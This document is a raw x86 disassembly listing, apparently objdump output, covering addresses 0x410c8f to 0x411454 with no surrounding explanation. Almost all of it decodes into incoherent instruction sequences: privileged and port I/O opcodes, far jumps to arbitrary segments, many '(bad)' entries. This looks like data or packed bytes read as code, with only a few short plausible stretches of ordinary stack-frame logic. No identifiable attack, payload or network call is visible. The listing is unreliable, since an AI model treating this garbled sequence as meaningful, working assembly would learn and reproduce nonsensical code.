  410c8f:	xchg   BYTE PTR [eax-0x43],bl
  410c92:	test   al,0x2c
  410c94:	invd   
  410c96:	cdq    
  410c97:	push   ebx
  410c98:	push   esp
  410c99:	inc    eax
  410c9a:	mov    ch,0xde
  410c9c:	loop   0x410c79
  410c9e:	fwait
  410c9f:	mov    cs,WORD PTR [ecx-0x25106559]
  410ca5:	adc    BYTE PTR [ecx],ch
  410ca7:	aas    
  410ca8:	jb     0x410d1f
  410caa:	(bad)  
  410cab:	xchg   ecx,eax
  410cac:	inc    esi
  410cad:	lock xchg DWORD PTR [esi],eax
  410cb0:	sub    esp,ebp
  410cb2:	fisttp WORD PTR [esi-0x21]
  410cb5:	retf   
  410cb6:	cmc    
  410cb7:	call   0x87c69e1
  410cbc:	jb     0x410ceb
  410cbe:	sub    BYTE PTR [ebx],al
  410cc0:	out    0x55,eax
  410cc2:	inc    edx
  410cc3:	imul   eax,ebp,0x4f42a012
  410cc9:	mul    DWORD PTR [ebp+edi*1+0x5d28734f]
  410cd0:	xor    BYTE PTR [ecx+0x53],dl
  410cd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cd4:	(bad)  
  410cd5:	cmp    edi,esp
  410cd7:	inc    ebx
  410cd8:	mov    WORD PTR [eax+0x4e],?
  410cdb:	mov    al,ds:0xf1692adf
  410ce0:	aad    0x5e
  410ce2:	cmp    eax,DWORD PTR [eax+0x59]
  410ce5:	push   0x1ab25baa
  410cea:	or     eax,0x49e9bedc
  410cef:	retf   
  410cf0:	or     al,0xc2
  410cf2:	outs   dx,BYTE PTR ds:[esi]
  410cf3:	out    dx,al
  410cf4:	pop    ebp
  410cf5:	call   0x99668095
  410cfa:	mov    bl,0x5
  410cfc:	inc    ebp
  410cfd:	vpsraw ymm3,ymm1,XMMWORD PTR [eax-0x1f]
  410d02:	sti    
  410d03:	lds    esi,FWORD PTR [ebp+eiz*1-0x78]
  410d07:	jne    0x410ca5
  410d09:	aaa    
  410d0a:	jmp    0x410cba
  410d0c:	mov    DWORD PTR [edx],eax
  410d0e:	mov    eax,DWORD PTR [ebp-0x8]
  410d11:	jmp    0x410fdf
  410d16:	je     0x410d40
  410d18:	(bad)  
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0x7e281e9c
  410d25:	mov    eax,0x7e7eb8eb
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	jl     0x410dab
  410d2d:	jle    0x410d40
  410d2f:	into   
  410d30:	xchg   BYTE PTR [edi+ebx*4-0x5b],ah
  410d34:	sbb    al,0x8
  410d36:	dec    ebx
  410d37:	xor    edx,ebx
  410d39:	mov    bh,0x52
  410d3b:	mov    al,ds:0x1a44855a
  410d40:	xchg   esp,eax
  410d41:	mov    cl,0xa0
  410d43:	in     al,dx
  410d44:	mov    ch,0x5d
  410d46:	(bad)  
  410d47:	fstp   TBYTE PTR [edx+ebp*1-0x5df9850f]
  410d4e:	push   0x78
  410d50:	jp     0x410cd9
  410d52:	enter  0x5b2a,0xda
  410d56:	cdq    
  410d57:	stos   DWORD PTR es:[edi],eax
  410d58:	sbb    eax,0x61b3d51f
  410d5d:	fs jp  0x410d5a
  410d60:	jmp    0x7555:0xe1540a5e
  410d67:	retf   0x55d9
  410d6a:	sub    BYTE PTR [ebp+0x73],bh
  410d6d:	add    esi,DWORD PTR [edx+ebp*2]
  410d70:	sahf   
  410d71:	icebp  
  410d72:	mov    ecx,0xbceaaf0c
  410d77:	xor    DWORD PTR [edi],edx
  410d79:	push   ecx
  410d7a:	pop    esi
  410d7b:	shl    DWORD PTR [edi+0x78],0xc1
  410d7f:	retf   0x91ae
  410d82:	inc    ecx
  410d83:	mov    edi,0x56e3c266
  410d88:	and    eax,0x24eb0fef
  410d8d:	mov    edx,cs
  410d8f:	shl    BYTE PTR [ebp-0x47],1
  410d92:	stos   BYTE PTR es:[edi],al
  410d93:	jae    0x410dd1
  410d95:	std    
  410d96:	cwde   
  410d97:	retf   0x879e
  410d9a:	mov    dh,0x13
  410d9c:	ds inc eax
  410d9e:	out    0xf6,eax
  410da0:	jo     0x410db6
  410da2:	jnp    0x410d3d
  410da4:	xchg   ebp,eax
  410da5:	clc    
  410da6:	loop   0x410d48
  410da8:	aam    0xd2
  410daa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dab:	fmul   DWORD PTR [ebp-0x448bf9a0]
  410db1:	ds inc edx
  410db3:	lea    ebx,[ecx+0x5e]
  410db6:	dec    esi
  410db7:	je     0x410e2a
  410db9:	and    DWORD PTR [ebp+0x458a56a7],esi
  410dbf:	add    BYTE PTR [ecx+0x25],dh
  410dc2:	push   es
  410dc3:	idiv   ch
  410dc5:	je     0x410d64
  410dc7:	mov    cs,WORD PTR ds:0x9f8aebc0
  410dcd:	mov    DWORD PTR [eax],0x4cbc6116
  410dd3:	adc    BYTE PTR [edx+edx*8],ah
  410dd6:	cs pop edi
  410dd8:	inc    edx
  410dd9:	sar    BYTE PTR [ecx+0x6f786ad8],1
  410ddf:	ja     0x410e59
  410de1:	xchg   BYTE PTR [edx+0x30],al
  410de4:	mov    bh,0x3c
  410de6:	pop    ds
  410de7:	nop
  410de8:	sbb    eax,DWORD PTR [ebx-0x5e]
  410deb:	arpl   WORD PTR [ebx+0x29],dx
  410dee:	ins    DWORD PTR es:[edi],dx
  410def:	sbb    esp,DWORD PTR [edi]
  410df1:	xor    eax,DWORD PTR [ebx+0x2f7be5cc]
  410df7:	aas    
  410df8:	(bad)  
  410df9:	mov    dl,0x92
  410dfb:	mov    eax,ds:0xe3e779cc
  410e00:	adc    esi,DWORD PTR [eax+ecx*8-0x36]
  410e04:	jl     0x410dbf
  410e06:	mov    ecx,0x6af8cb0f
  410e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e0c:	test   al,0x40
  410e0e:	aaa    
  410e0f:	pop    eax
  410e10:	mov    al,0x5d
  410e12:	sahf   
  410e13:	not    BYTE PTR [ebx]
  410e15:	ins    DWORD PTR es:[edi],dx
  410e16:	pop    edi
  410e17:	mov    DWORD PTR [ebx],ebp
  410e19:	daa    
  410e1a:	mov    ebx,DWORD PTR [ecx]
  410e1c:	and    al,0x8e
  410e1e:	retf   
  410e1f:	shr    eax,cl
  410e21:	adc    bh,BYTE PTR ds:0x540acb8f
  410e27:	add    bl,BYTE PTR [edx+0x6f]
  410e2a:	fild   WORD PTR [ecx+eiz*2+0x270def73]
  410e31:	xor    eax,0xe46a308c
  410e36:	push   edx
  410e37:	call   0x4e7c0e2f
  410e3c:	inc    esp
  410e3d:	add    DWORD PTR ds:0x2ef0469,edx
  410e43:	ja     0x410dca
  410e45:	sub    DWORD PTR [edi+ecx*8-0x61],ebx
  410e49:	outs   dx,DWORD PTR ds:[esi]
  410e4a:	retf   
  410e4b:	out    dx,al
  410e4c:	fbld   TBYTE PTR [ebp+0x12]
  410e4f:	mov    ds:0x2d62bb59,eax
  410e54:	jmp    0x410e67
  410e56:	push   es
  410e57:	and    DWORD PTR [ebp-0x7f],esi
  410e5a:	xor    BYTE PTR [ebx],dh
  410e5c:	in     al,0x56
  410e5e:	jo     0x410e8c
  410e60:	stc    
  410e61:	repz adc BYTE PTR [eax-0xa],bh
  410e65:	add    esi,DWORD PTR [edx+eiz*4+0x6a407d9c]
  410e6c:	dec    edx
  410e6d:	or     al,0xd0
  410e6f:	adc    DWORD PTR [eax],0x3e2de29d
  410e75:	loopne 0x410e6d
  410e77:	jmp    0x667f:0x28927739
  410e7e:	dec    eax
  410e7f:	dec    esp
  410e80:	call   DWORD PTR [esi-0x5ab20247]
  410e86:	jmp    0x410ee3
  410e88:	pop    es
  410e89:	lds    ebx,FWORD PTR [ebx-0x61]
  410e8c:	fdivr  QWORD PTR [ecx]
  410e8e:	or     al,0xc9
  410e90:	les    edi,FWORD PTR [ebx-0x7b]
  410e93:	mov    edi,0x2598eaf9
  410e98:	sahf   
  410e99:	pop    edx
  410e9a:	push   ss
  410e9b:	pop    ecx
  410e9c:	iret   
  410e9d:	cmp    ch,dh
  410e9f:	stos   BYTE PTR es:[edi],al
  410ea0:	call   0xafec6ce4
  410ea5:	ror    DWORD PTR [esi-0x78],0x7a
  410ea9:	outs   dx,DWORD PTR ds:[esi]
  410eaa:	dec    ebp
  410eab:	xchg   ebx,eax
  410eac:	aas    
  410ead:	adc    al,0x47
  410eaf:	and    al,0x10
  410eb1:	mov    ebx,DWORD PTR [ecx]
  410eb3:	and    ebp,DWORD PTR [edx+0x22c8875c]
  410eb9:	retf   0xbfb7
  410ebc:	cmp    eax,0x7c3ca6b
  410ec1:	mov    al,0x41
  410ec3:	pop    edx
  410ec4:	push   0xffffffde
  410ec6:	add    bl,BYTE PTR [eax+edx*1+0x67b19f1a]
  410ecd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ece:	jle    0x410eba
  410ed0:	cli    
  410ed1:	cs int3 
  410ed3:	ins    DWORD PTR es:[edi],dx
  410ed4:	pushf  
  410ed5:	dec    esi
  410ed6:	mov    bl,0xbc
  410ed8:	sbb    al,0x5a
  410eda:	mov    eax,ds:0xf5d47ee1
  410edf:	aam    0x1f
  410ee1:	sub    al,0x6d
  410ee3:	pop    ecx
  410ee4:	imul   DWORD PTR [ebp+eiz*1-0x30]
  410ee8:	add    eax,0x8726c828
  410eed:	jb     0x410edb
  410eef:	push   eax
  410ef0:	ficom  WORD PTR [eax+0x47]
  410ef3:	mov    bh,0x79
  410ef5:	js     0x410f20
  410ef7:	xor    al,0x7f
  410ef9:	xchg   edi,eax
  410efa:	mov    eax,ds:0x793110a1
  410eff:	mov    eax,0xce2c8f2
  410f04:	fs jno 0x410efe
  410f07:	scas   al,BYTE PTR es:[edi]
  410f08:	dec    eax
  410f09:	ret    0xc6
  410f0c:	jne    0x410f48
  410f0e:	rol    BYTE PTR [esi],cl
  410f10:	repnz fs cld 
  410f13:	nop
  410f14:	xor    ebp,DWORD PTR [edx-0x7f]
  410f17:	inc    ebp
  410f18:	jbe    0x410eb3
  410f1a:	push   esp
  410f1b:	jbe    0x410f99
  410f1d:	pop    ebp
  410f1e:	out    0xf1,eax
  410f20:	imul   eax,DWORD PTR [ebp-0x2b],0xdb54db61
  410f27:	mov    ah,0xda
  410f29:	js     0x410f5d
  410f2b:	push   edx
  410f2c:	ror    esp,cl
  410f2e:	out    0x7e,eax
  410f30:	outs   dx,DWORD PTR ds:[esi]
  410f31:	xor    al,dl
  410f33:	call   0x50ab:0xb8c154f0
  410f3a:	icebp  
  410f3b:	add    ebx,esp
  410f3d:	(bad)  
  410f3e:	push   esi
  410f3f:	repz aas 
  410f41:	and    al,0x7c
  410f43:	dec    ebp
  410f44:	int    0x97
  410f46:	sbb    al,0xd6
  410f48:	fcomp  DWORD PTR [edx-0x18]
  410f4b:	outs   dx,BYTE PTR ds:[esi]
  410f4c:	mov    eax,0x96cbfcc9
  410f51:	(bad)  
  410f53:	pushf  
  410f54:	jns    0x410ef7
  410f56:	sbb    DWORD PTR [ecx+edx*1+0x419269d0],ecx
  410f5d:	or     al,BYTE PTR [edx+0x7b7fdab3]
  410f63:	pop    ebx
  410f64:	push   eax
  410f65:	dec    edx
  410f66:	jne    0xdbab2b19
  410f6c:	jb     0x410f79
  410f6e:	out    0xd0,eax
  410f70:	sbb    BYTE PTR [eax+0x5e7f2ee2],0x13
  410f77:	out    dx,al
  410f78:	je     0x410fd7
  410f7a:	not    cl
  410f7c:	scas   al,BYTE PTR es:[edi]
  410f7d:	imul   eax,DWORD PTR [edx+0x703ff30d],0xffffffff
  410f84:	test   BYTE PTR [ecx+0x3c51b84a],ah
  410f8a:	xor    BYTE PTR [edx],bh
  410f8c:	xchg   ecx,eax
  410f8d:	dec    ebp
  410f8e:	xchg   esi,eax
  410f8f:	rol    BYTE PTR [ecx+esi*1-0x62136b78],0x80
  410f97:	stc    
  410f98:	call   0x876eacb
  410f9d:	ss jno 0x41100b
  410fa0:	xchg   edi,eax
  410fa1:	pop    ebx
  410fa2:	mov    edx,0xa7a64498
  410fa7:	ficom  DWORD PTR [ecx-0x41c72575]
  410fad:	test   DWORD PTR [edx-0x1934a8a8],0x5caccfb3
  410fb7:	pmaddwd mm4,QWORD PTR ds:0x46e781a6
  410fbe:	pop    ebp
  410fbf:	mov    ebx,0x18a3bd57
  410fc4:	loope  0x411045
  410fc6:	and    DWORD PTR [edx+0x4c],edx
  410fc9:	test   eax,edi
  410fcb:	or     al,0x5f
  410fcd:	mov    eax,ds:0x26aac10b
  410fd2:	or     DWORD PTR [ecx],eax
  410fd4:	stos   BYTE PTR es:[edi],al
  410fd5:	xchg   dh,dl
  410fd7:	les    esp,FWORD PTR [edi]
  410fd9:	call   0x3390:0x25dc9a7b
  410fe0:	rol    DWORD PTR [ebx],0xc6
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x410fc3
  41102b:	aas    
  41102c:	stos   BYTE PTR es:[edi],al
  41102d:	mov    ah,0x18
  41102f:	inc    edi
  411030:	jle    0x4110b0
  411032:	scas   eax,DWORD PTR es:[edi]
  411033:	jl     0x4110b3
  411035:	jle    0x411078
  411037:	xor    BYTE PTR [ebx+0x2ef577c6],ah
  41103d:	fs inc ebx
  41103f:	cld    
  411040:	std    
  411041:	jmp    0x410ffc
  411043:	rcr    BYTE PTR [ecx+0x47],1
  411046:	repnz dec ebx
  411048:	call   FWORD PTR [ecx+0x12]
  41104b:	inc    ebx
  41104c:	jmp    0x4110c9
  41104e:	cdq    
  41104f:	sbb    BYTE PTR [edx+0xa],ah
  411052:	outs   dx,BYTE PTR ds:[esi]
  411053:	cmp    eax,eax
  411055:	push   edi
  411056:	(bad)  
  411057:	xchg   edx,eax
  411058:	fld    TBYTE PTR [edi+0x3f]
  41105b:	or     esi,edi
  41105d:	pop    ss
  41105e:	and    ch,dl
  411060:	ficomp WORD PTR ds:0x751ef4e1
  411066:	fistp  WORD PTR [eax+eiz*2-0x7672b00b]
  41106d:	mov    cl,0xdb
  41106f:	jno    0x4110dd
  411071:	dec    edx
  411072:	jmp    0x411054
  411074:	xchg   ebp,eax
  411075:	adc    eax,0x9cd45950
  41107a:	pop    edx
  41107b:	push   ebp
  41107c:	mov    ds:0xa2991978,eax
  411081:	retf   
  411082:	in     eax,0xf5
  411084:	es scas eax,DWORD PTR es:[edi]
  411086:	and    ecx,DWORD PTR [ecx]
  411088:	inc    edx
  411089:	cli    
  41108a:	ins    DWORD PTR es:[edi],dx
  41108b:	aas    
  41108c:	inc    ebx
  41108d:	rcl    BYTE PTR [edi+0x1f8d7c5d],0xad
  411094:	inc    ebx
  411095:	xchg   esi,eax
  411096:	adc    eax,0xccbf3239
  41109b:	or     al,0x95
  41109d:	inc    ebp
  41109e:	imul   esp,DWORD PTR [ebx+0x2],0x5f38a70
  4110a5:	mov    BYTE PTR [ecx+edi*2+0xe],ah
  4110a9:	jns    0x41105a
  4110ab:	xor    eax,ecx
  4110ad:	daa    
  4110ae:	(bad)  
  4110af:	sub    eax,0x8b37da73
  4110b4:	or     bl,BYTE PTR [ecx]
  4110b6:	out    dx,eax
  4110b7:	int    0xac
  4110b9:	mov    ah,al
  4110bb:	xchg   ecx,eax
  4110bc:	xchg   edx,eax
  4110bd:	ins    BYTE PTR es:[edi],dx
  4110be:	jne    0x4110b0
  4110c0:	cmp    eax,0x8c41d8a1
  4110c5:	xchg   DWORD PTR [ecx+0x533f80be],esi
  4110cb:	imul   ebp,edx,0xffffffa7
  4110ce:	mov    al,0x2
  4110d0:	out    0x66,al
  4110d2:	sub    DWORD PTR [ebx+edi*8-0x357d1778],edi
  4110d9:	pop    ss
  4110da:	les    ebp,FWORD PTR [edx-0xe]
  4110dd:	add    edi,esp
  4110df:	cli    
  4110e0:	jmp    0x199:0xd10dea5f
  4110e7:	ins    BYTE PTR es:[edi],dx
  4110e8:	adc    al,0xe6
  4110ea:	add    eax,0xffffffa5
  4110ed:	xchg   esp,eax
  4110ee:	adc    ch,BYTE PTR [edi-0x5d272be7]
  4110f4:	fs mov esi,0xb0f930d0
  4110fa:	clc    
  4110fb:	push   edi
  4110fc:	dec    edi
  4110fd:	(bad)  
  4110fe:	sti    
  4110ff:	inc    esi
  411100:	mov    ecx,0x67d1d89
  411105:	sahf   
  411106:	bound  esp,QWORD PTR [eax+ecx*1-0x1c7abdf5]
  41110d:	daa    
  41110e:	ins    BYTE PTR es:[edi],dx
  41110f:	scas   eax,DWORD PTR es:[edi]
  411110:	adc    al,0x89
  411112:	jecxz  0x4110bf
  411114:	push   esp
  411115:	(bad)  
  411116:	jp     0x411100
  411118:	sub    al,0xc2
  41111a:	sbb    BYTE PTR [eax],0xc4
  41111d:	fs stc 
  41111f:	and    ebp,DWORD PTR [eax-0x68]
  411122:	sbb    ecx,DWORD PTR [ebx]
  411124:	fidivr WORD PTR [edi+0x181e3641]
  41112a:	xor    ecx,esi
  41112c:	hlt    
  41112d:	xchg   ecx,eax
  41112e:	push   0x9efa9d40
  411133:	(bad)  
  411134:	fmul   QWORD PTR [ebp-0x5e]
  411137:	daa    
  411138:	mov    ?,WORD PTR ds:[esi+0x3e10388e]
  41113f:	jg     0x411148
  411141:	mov    ah,0x40
  411143:	scas   eax,DWORD PTR es:[edi]
  411144:	iret   
  411145:	icebp  
  411146:	jmp    0x41119d
  411148:	imul   esp,ebx,0xfd044614
  41114e:	inc    ebp
  41114f:	mov    eax,ds:0x6f71aa7e
  411154:	mov    bh,0x11
  411156:	out    dx,eax
  411157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411158:	mov    cl,0x1
  41115a:	pop    esi
  41115b:	(bad)  
  41115c:	out    0x3a,al
  41115e:	xlat   BYTE PTR ds:[ebx]
  41115f:	adc    esp,DWORD PTR fs:[edx]
  411162:	jp     0x41119d
  411164:	sub    al,0xe9
  411166:	xor    BYTE PTR [edx+0x47676fd1],bh
  41116c:	inc    ecx
  41116d:	arpl   WORD PTR [edi],si
  41116f:	or     eax,0x8a332cf4
  411174:	dec    ecx
  411175:	enter  0x381e,0x44
  411179:	hlt    
  41117a:	daa    
  41117b:	jo     0x411168
  41117d:	jns    0x41116c
  41117f:	cmc    
  411180:	and    bh,BYTE PTR [edi+esi*2+0x54]
  411184:	jbe    0x411184
  411186:	retf   
  411187:	pop    ss
  411188:	std    
  411189:	add    cl,BYTE PTR [eax]
  41118b:	xchg   edi,eax
  41118c:	or     eax,0x90e7ae51
  411191:	stos   BYTE PTR es:[edi],al
  411192:	outs   dx,BYTE PTR ds:[esi]
  411193:	or     BYTE PTR [edi-0x5c],0xa3
  411197:	cmp    eax,0xce1577e9
  41119c:	jns    0x411184
  41119e:	hlt    
  41119f:	addr16 out dx,eax
  4111a1:	inc    edi
  4111a2:	rcl    DWORD PTR [edx-0x2a8dd45b],0x47
  4111a9:	mov    esi,0xf1c2567e
  4111ae:	hlt    
  4111af:	frstor [ebx-0x60]
  4111b2:	retf   
  4111b3:	cdq    
  4111b4:	sbb    al,0x4c
  4111b6:	push   edx
  4111b7:	fisttp WORD PTR [ebp-0x3b23fe2d]
  4111bd:	dec    edi
  4111be:	das    
  4111bf:	jns    0x4111ba
  4111c1:	xchg   ecx,eax
  4111c3:	pop    ebx
  4111c4:	dec    edx
  4111c5:	js     0x41118e
  4111c7:	clc    
  4111c8:	popa   
  4111c9:	ficom  DWORD PTR [eax-0x7c]
  4111cc:	xlat   BYTE PTR ds:[ebx]
  4111cd:	and    al,0x7f
  4111cf:	sub    DWORD PTR [edx+0x1b],edx
  4111d2:	dec    edx
  4111d3:	push   ecx
  4111d4:	adc    ebp,ebp
  4111d6:	push   ebx
  4111d7:	scas   eax,DWORD PTR es:[edi]
  4111d8:	xor    DWORD PTR [edx-0x60],edx
  4111db:	aas    
  4111dc:	out    0x4b,al
  4111de:	mov    al,cl
  4111e0:	jg     0x411221
  4111e2:	mov    eax,ds:0x9f474933
  4111e7:	add    DWORD PTR [edx],ebp
  4111e9:	mov    edi,0xdefa577a
  4111ee:	stos   DWORD PTR es:[edi],eax
  4111ef:	inc    edi
  4111f0:	mov    cl,0xd3
  4111f2:	mov    BYTE PTR [edx],bh
  4111f4:	mov    fs,WORD PTR [edx+0x3f]
  4111f7:	icebp  
  4111f8:	add    al,0x1e
  4111fa:	(bad)  [edi+0x560849ad]
  411200:	cmp    bh,BYTE PTR [esi]
  411202:	adc    DWORD PTR ss:[ebx],ebx
  411205:	ds push esp
  411207:	shl    BYTE PTR [ecx-0x2ecc2372],cl
  41120d:	ret    
  41120e:	push   ds
  41120f:	scas   al,BYTE PTR es:[edi]
  411210:	(bad)  
  411211:	jb     0x4111d8
  411213:	push   ds
  411214:	test   BYTE PTR [edx-0x145f62c],al
  41121a:	mov    ebp,0x25d8e3e
  41121f:	in     eax,0x4
  411221:	in     al,0xf6
  411223:	loopne 0x411229
  411225:	cdq    
  411226:	sti    
  411227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411228:	dec    ebx
  411229:	jmp    0xde627a9c
  41122e:	iret   
  41122f:	out    dx,eax
  411230:	adc    BYTE PTR [ebp+eax*8-0x64],al
  411234:	jmp    FWORD PTR [ebx*8+0x4bfaae1b]
  41123b:	jle    0x411210
  41123d:	xchg   ebp,eax
  41123e:	push   cs
  41123f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411240:	js     0x4111d7
  411242:	push   0x7f
  411244:	xor    BYTE PTR [eax-0x17],bl
  411247:	shr    edi,cl
  411249:	les    ebp,FWORD PTR [esi+0x4b]
  41124c:	popf   
  41124d:	and    BYTE PTR [edi-0x7e],0x76
  411251:	cdq    
  411252:	inc    ebx
  411253:	add    eax,0x8fa2f399
  411258:	aad    0x31
  41125a:	adc    ecx,DWORD PTR [ecx]
  41125c:	stc    
  41125d:	dec    edi
  41125e:	int3   
  41125f:	or     DWORD PTR [ecx+eiz*8+0x620f5d6b],edx
  411266:	aas    
  411267:	dec    eax
  411268:	jmp    FWORD PTR [ecx]
  41126a:	or     al,0x22
  41126c:	sbb    DWORD PTR [bx+di+0x6fdf],edi
  411271:	in     eax,0x50
  411273:	pop    esp
  411274:	fmul   st(2),st
  411276:	xor    DWORD PTR [esi-0x36d04f7e],eax
  41127c:	sub    dh,bl
  41127e:	xchg   al,bh
  411280:	push   esp
  411281:	in     al,dx
  411282:	jae    0x4112ec
  411284:	retf   0x1d6d
  411287:	aas    
  411288:	adc    eax,0xe808154d
  41128d:	adc    DWORD PTR [ecx-0x70],esi
  411290:	data16 sbb ch,BYTE PTR [ecx-0x781472]
  411297:	rcl    BYTE PTR [esi],1
  411299:	sbb    DWORD PTR [eax-0x59],ecx
  41129c:	xor    dh,BYTE PTR [ebx]
  41129e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41129f:	xor    BYTE PTR [edx-0xc00119e],dl
  4112a5:	inc    esp
  4112a6:	ins    DWORD PTR es:[edi],dx
  4112a7:	mov    dl,0xd2
  4112a9:	cmp    eax,0xd4748990
  4112ae:	repz add edx,DWORD PTR [esi-0x71]
  4112b2:	aaa    
  4112b3:	adc    DWORD PTR [eax-0x546132c0],ebp
  4112b9:	mov    dl,0x89
  4112bb:	or     eax,0x2f78b5f5
  4112c0:	pop    edi
  4112c1:	imul   edx,DWORD PTR [ebp-0x67fc15a8],0xffffff81
  4112c8:	pushf  
  4112c9:	inc    eax
  4112ca:	and    bl,BYTE PTR [esi]
  4112cc:	push   eax
  4112cd:	adc    eax,0xbf8c5762
  4112d2:	in     al,dx
  4112d3:	push   ss
  4112d4:	sub    BYTE PTR [eax],ah
  4112d6:	and    bl,BYTE PTR [edi-0x10c53b04]
  4112dc:	test   DWORD PTR [edx-0x2e],ebp
  4112df:	idiv   BYTE PTR [ecx+0xd]
  4112e2:	div    DWORD PTR [edi]
  4112e4:	fisttp QWORD PTR [edi]
  4112e6:	into   
  4112e7:	je     0x4115eb
  4112ed:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0xc168f61e,eax
  411318:	call   0x458a7b69
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x411399
  411324:	xchg   ecx,eax
  411325:	xor    BYTE PTR [ebx-0x784e6463],dl
  41132b:	sar    ebx,1
  41132d:	jb     0x411329
  41132f:	add    eax,DWORD PTR [ecx-0x2e]
  411332:	loope  0x41137b
  411334:	ins    DWORD PTR es:[edi],dx
  411335:	pusha  
  411336:	popa   
  411337:	sub    al,0x3a
  411339:	repnz or DWORD PTR [ebx+0x1bc8e455],edi
  411340:	and    ebx,DWORD PTR [esi]
  411342:	mov    esi,0x8ebbdf2f
  411347:	sbb    eax,0x2b823d2c
  41134c:	test   ecx,ebp
  41134e:	aas    
  41134f:	xor    eax,0x1de4929d
  411354:	fst    DWORD PTR [eax-0x691e323d]
  41135a:	push   eax
  41135b:	arpl   WORD PTR [edi+ebx*2-0x53],di
  41135f:	ds out 0x24,eax
  411362:	mov    bl,0xdb
  411364:	sub    al,0x7a
  411366:	mov    bl,cl
  411368:	adc    dl,BYTE PTR [eax-0x44]
  41136b:	pop    eax
  41136c:	mov    al,ds:0x8ebdff64
  411371:	add    ecx,DWORD PTR ds:0x7ae00057
  411377:	push   ss
  411378:	hlt    
  411379:	mov    ebx,0xb1f21538
  41137e:	adc    al,0x99
  411380:	dec    edi
  411381:	out    dx,eax
  411382:	ror    al,cl
  411384:	mov    esi,0xc37c4f17
  411389:	lahf   
  41138a:	sbb    al,0x84
  41138c:	imul   ecx,DWORD PTR [esi+0x450397e],0x4124972
  411396:	fsub   DWORD PTR [edx+0x55]
  411399:	xor    esi,eax
  41139b:	fisub  DWORD PTR [ebp+0x5cc62d52]
  4113a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113a2:	jae    0x4113d0
  4113a4:	cmp    eax,edx
  4113a6:	mov    eax,ds:0xffedcb2b
  4113ab:	sbb    edx,0xffffffee
  4113ae:	jmp    0x411348
  4113b0:	and    eax,0xe82ce491
  4113b5:	jp     0x4113f2
  4113b7:	enter  0x7cec,0x4d
  4113bb:	rcr    BYTE PTR [edi],cl
  4113bd:	sahf   
  4113be:	mov    dl,0x1b
  4113c0:	clc    
  4113c1:	or     eax,0x5d4b843c
  4113c6:	in     al,0xe8
  4113c8:	dec    edi
  4113c9:	cld    
  4113ca:	sbb    DWORD PTR [edx+0x4782ddaf],ebx
  4113d0:	stos   BYTE PTR es:[edi],al
  4113d1:	in     eax,dx
  4113d2:	adc    eax,0x757f8925
  4113d7:	and    DWORD PTR fs:[eax-0x6a],eax
  4113db:	or     eax,0xa54d3bc2
  4113e0:	daa    
  4113e1:	sbb    ch,dl
  4113e3:	clc    
  4113e4:	lea    edi,[eax+esi*4+0x8]
  4113e8:	js     0x4113b5
  4113ea:	adc    eax,0xf6251671
  4113ef:	mov    ebx,DWORD PTR [si+0x68b8]
  4113f4:	pop    ecx
  4113f5:	lahf   
  4113f6:	std    
  4113f7:	ds das 
  4113f9:	retf   0x38f5
  4113fc:	add    al,0x9d
  4113fe:	stos   DWORD PTR es:[edi],eax
  4113ff:	jp     0x4113c7
  411401:	add    al,0xd8
  411403:	add    dl,ah
  411405:	shl    dh,0x58
  411408:	dec    esp
  411409:	mov    edi,0x9ea80116
  41140e:	xchg   esi,eax
  41140f:	jge    0x411464
  411411:	push   ebx
  411412:	mov    ebp,0xb0a872c4
  411417:	jmp    0x7960:0xe1882024
  41141e:	cmp    eax,0x9a1165c5
  411423:	pop    ebp
  411424:	mov    DWORD PTR [edi+0x473a1806],edi
  41142a:	pop    ss
  41142b:	leave  
  41142c:	adc    eax,0x8c5b6ddb
  411432:	xlat   BYTE PTR ds:[ebx]
  411433:	mov    bl,0x25
  411435:	pop    DWORD PTR [edx+0x586bce9c]
  41143b:	dec    ebx
  41143c:	daa    
  41143d:	push   ds
  41143e:	xor    al,0x72
  411440:	mov    esi,0x2a9421f9
  411445:	cld    
  411446:	pop    ebp
  411447:	(bad)  
  411448:	dec    ebp
  411449:	push   ecx
  41144a:	jno    0x411493
  41144c:	bound  eax,QWORD PTR ds:0xb3608905
  411452:	pop    ebp
  411453:	into   
  411454:	xor    al,0x41
